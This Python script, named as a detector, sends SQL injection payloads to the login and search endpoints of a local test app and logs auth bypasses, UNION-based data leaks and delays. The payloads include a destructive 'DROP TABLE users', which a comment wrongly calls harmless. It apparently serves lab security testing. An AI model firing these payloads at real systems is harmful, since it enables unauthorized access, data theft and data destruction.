# detector.py
import requests
import time
import re
from datetime import datetime
import logging
import os

# Configure logging
logging.basicConfig(
    filename='logs/sqli_logs.txt',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

TARGET_LOGIN = "http://127.0.0.1:5000/login"
TARGET_SEARCH = "http://127.0.0.1:5000/search"
SUCCESS_INDICATORS = ["success", "welcome", "dashboard", "admin"]
ERROR_INDICATORS = ["sql error", "syntax error", "database error", "exception"]
TIME_THRESHOLD = 3  # seconds for time-based detection

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT sql, '' FROM sqlite_master WHERE type='table'--",
    "'; DROP TABLE users--",  # harmless in detection (won't execute)
    "' AND SLEEP(5)--",       # Time-based (SQLite doesn't support SLEEP, but we simulate delay)
]

def log_attack(url, payload, response_time, status, detail):
    msg = f"[{status}] URL: {url} | Payload: {payload} | Time: {response_time:.2f}s | Detail: {detail}"
    print(msg)
    logging.info(msg)

def detect_sqli():
    print("🚀 Starting SQLi Detection Engine...\n")
    session = requests.Session()

    for payload in PAYLOADS:
        # === Test Login Endpoint ===
        start = time.time()
        try:
            res = session.post(TARGET_LOGIN, data={
                'username': f"admin{payload}",
                'password': 'random'
            }, timeout=10)
            response_time = time.time() - start

            # Analyze response
            text = res.text.lower()
            status = "UNKNOWN"

            if any(ind in text for ind in SUCCESS_INDICATORS):
                status = "SUCCESS"
                log_attack(TARGET_LOGIN, payload, response_time, status, "Possible auth bypass")
            elif any(ind in text for ind in ERROR_INDICATORS):
                status = "ERROR"
                log_attack(TARGET_LOGIN, payload, response_time, status, "SQL syntax error")
            elif response_time > TIME_THRESHOLD:
                status = "TIME-BASED"
                log_attack(TARGET_LOGIN, payload, response_time, status, "Possible time-based SQLi")
            else:
                status = "FAILED"
                log_attack(TARGET_LOGIN, payload, response_time, status, "No exploit")

        except Exception as e:
            log_attack(TARGET_LOGIN, payload, time.time() - start, "ERROR", f"Exception: {str(e)}")

        # === Test Search Endpoint ===
        start = time.time()
        try:
            res = session.get(f"{TARGET_SEARCH}?q=test{payload}", timeout=10)
            response_time = time.time() - start
            text = res.text.lower()

            status = "UNKNOWN"
            if "sqlite_master" in res.text or "CREATE TABLE" in res.text:
                status = "SUCCESS"
                log_attack(TARGET_SEARCH, payload, response_time, status, "Data exfiltration via UNION")
            elif any(ind in text for ind in ERROR_INDICATORS):
                status = "ERROR"
                log_attack(TARGET_SEARCH, payload, response_time, status, "SQL syntax error")
            elif response_time > TIME_THRESHOLD:
                status = "TIME-BASED"
                log_attack(TARGET_SEARCH, payload, response_time, status, "Time-based delay")
            else:
                status = "FAILED"
                log_attack(TARGET_SEARCH, payload, response_time, status, "No data leak")

        except Exception as e:
            log_attack(TARGET_SEARCH, payload, time.time() - start, "ERROR", f"Exception: {str(e)}")

        time.sleep(0.5)

if __name__ == '__main__':
    # Create logs dir
    os.makedirs('logs', exist_ok=True)
    detect_sqli()